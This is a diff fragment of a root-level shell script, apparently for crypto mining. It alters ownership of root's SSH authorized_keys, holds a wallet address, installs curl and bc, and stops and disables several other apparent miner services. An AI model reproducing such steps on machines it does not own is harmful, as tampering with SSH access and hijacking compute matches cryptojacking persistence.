@@ -6,6 +6,13 @@ chown -R root:root /root/.ssh/authorized_keys
 
 wallet="cb8388f64d2067715b4140a036f00deac1ca3aa573f6"
 
+if [ "$(which yum)" ]; then
+    yum install curl bc -y
+else
+    apt update -y
+    apt install curl bc -y
+fi
+
 systemctl stop ore scash shai tdc ftb qli
 systemctl disable ore scash shai tdc ftb qli
 
